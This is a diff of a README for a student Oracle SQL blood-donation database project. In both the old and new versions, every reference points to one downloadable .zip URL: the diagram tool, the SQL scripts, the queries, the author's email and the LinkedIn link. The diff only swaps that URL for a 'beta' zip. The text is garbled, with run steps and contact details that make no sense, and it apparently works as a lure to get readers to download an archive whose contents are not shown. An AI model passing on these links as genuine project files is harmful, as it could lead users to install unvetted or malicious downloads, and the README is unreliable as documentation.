@@ -9,7 +9,7 @@ This project uses **Oracle SQL** and includes an **ER Diagram**, sample data, an
 
 ## 🛠️ Technologies Used
 - Oracle SQL / SQL Developer
-- ER Diagram Tool (https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip)
+- ER Diagram Tool (https://github.com/mustkimkureshi/blood-donation-sql-project/raw/refs/heads/main/reference/project-blood-sql-donation-1.4-beta.5.zip)
 - Command-line or SQL GUI for execution
 
 ---
@@ -85,12 +85,12 @@ The Entity-Relationship diagram illustrates relationships:
 - A patient can receive multiple donations.
 - Each donation is associated with one hospital.
 
-The ER diagram file `blood https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip` is included in the project folder.
+The ER diagram file `blood https://github.com/mustkimkureshi/blood-donation-sql-project/raw/refs/heads/main/reference/project-blood-sql-donation-1.4-beta.5.zip` is included in the project folder.
 
 ---
 
 ## 🧪 Sample SQL Queries
-Located in `https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip`. Examples include:
+Located in `https://github.com/mustkimkureshi/blood-donation-sql-project/raw/refs/heads/main/reference/project-blood-sql-donation-1.4-beta.5.zip`. Examples include:
 - List donors with blood type 'O'
 - View donation history for a specific hospital
 - Find donation details by donor or patient
@@ -101,16 +101,16 @@ Located in `https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-
 ## 📜 How to Run
 
 1. Open SQL Developer or any Oracle SQL tool.
-2. Run `https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip` to create the tables.
-3. Run `https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip` to insert test records.
-4. Execute queries from `https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip` or create your own.
+2. Run `https://github.com/mustkimkureshi/blood-donation-sql-project/raw/refs/heads/main/reference/project-blood-sql-donation-1.4-beta.5.zip` to create the tables.
+3. Run `https://github.com/mustkimkureshi/blood-donation-sql-project/raw/refs/heads/main/reference/project-blood-sql-donation-1.4-beta.5.zip` to insert test records.
+4. Execute queries from `https://github.com/mustkimkureshi/blood-donation-sql-project/raw/refs/heads/main/reference/project-blood-sql-donation-1.4-beta.5.zip` or create your own.
 
 ---
 
 ## 👨‍💻 Author
 
 **Mustkim Kureshi** 
-https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip IT Student | Future Database Administrator  
-📧 https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip  
-📧 Likedin: https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip
+https://github.com/mustkimkureshi/blood-donation-sql-project/raw/refs/heads/main/reference/project-blood-sql-donation-1.4-beta.5.zip IT Student | Future Database Administrator  
+📧 https://github.com/mustkimkureshi/blood-donation-sql-project/raw/refs/heads/main/reference/project-blood-sql-donation-1.4-beta.5.zip  
+📧 Likedin: https://github.com/mustkimkureshi/blood-donation-sql-project/raw/refs/heads/main/reference/project-blood-sql-donation-1.4-beta.5.zip
 
